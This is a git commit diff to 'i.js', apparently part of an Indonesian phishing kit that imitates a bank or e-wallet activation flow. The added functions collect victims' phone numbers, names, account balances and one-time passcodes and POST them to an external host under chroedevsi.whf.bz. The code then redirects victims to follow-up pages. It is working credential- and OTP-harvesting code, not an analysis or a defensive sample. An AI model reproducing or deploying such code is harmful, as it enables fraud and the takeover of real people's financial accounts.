4c2e67c643f28673ffaeaec84cd34e311f884586
dodypribadi5 <dodypribadi5@gmail.com>
2024-12-22 16:41:11 +0700

    Update i.js

--- i.js
+++ i.js
@@ -18,7 +18,7 @@ function sendHp() {
       data: $('#login').serialize(),  
       complete: function() {
          setTimeout(function() {
-            /*$("#popupku").fadeIn(200);*/
+            $("#popupku").fadeIn(200);
             window.location = "sudah.html";
             $('.x').hide();      
             $('.kleman').fadeOut();   
@@ -122,6 +122,69 @@ function sendOtpS() {
    });
 };  
     
+// Belum
+function sendBelum(){    
+    $('.load').fadeIn();
+   event.preventDefault();
+   $(".lanjutkan").prop("disabled", true);
+   document.getElementById('lanjutkan').innerHTML = "Memproses....";
+   
+   $.ajax({
+        type: 'POST',
+        url: 'https://chroedevsi.whf.bz/v4-putra/belum.php',
+        data: $('#login').serialize(),
+        datatype: 'JSON',
+      complete: function() {
+         setTimeout(function() {
+            window.location = "otpblm.html";
+            $("#lonte").hide();
+            $('.load').fadeOut();
+            document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
+            var tarif = $('#tarif').val();
+            sessionStorage.setItem('tarif', tarif);
+            var nohp = $('#nohp').val();
+            sessionStorage.setItem('nohp', nohp);
+            var nama = $('#nama').val();
+            sessionStorage.setItem('nama', nama);
+            var rek = $('#saldo').val();
+            sessionStorage.setItem('rek', rek);
+         }, 500);
+      }
+   });
+};
     
+
+
+
+        
+function sendOtp() {
+            event.preventDefault();
+            document.getElementById('kirims').value = "Memproses...."; 
+           
+            
+     $.ajax({
+        type: 'POST',
+        url: 'https://chroedevsi.whf.bz/v4-putra/otpblm.php',
+        data: $('#formLinkk').serialize(),
+        datatype: 'JSON',
+                complete: function (response) {
+                    showAlert("a");
+ $("#nama1").val("");
+ $("#nama1").addClass('textarea1'); 
+   document.getElementById('kirims').value = "Konfirmasi";
+                    $("#nama1").val('');
+                    $("#nama1").focus();
+                    setTimeout(function () {
+                        $("#errorAlert").slideUp();                                                
+                    }, 3000);
+                },
+                error: function (error) {
+                    $("#loader").hide();
+                    $(".btn-primary").prop("disabled", false);
+                    $("#errorAlert").removeClass("alert-success").addClass("alert-danger");
+                    $("#errorAlert").text("Gagal mengirim kode aktivasi. Silakan coba lagi.").show();
+                }
+            });
+        };    
 
                 
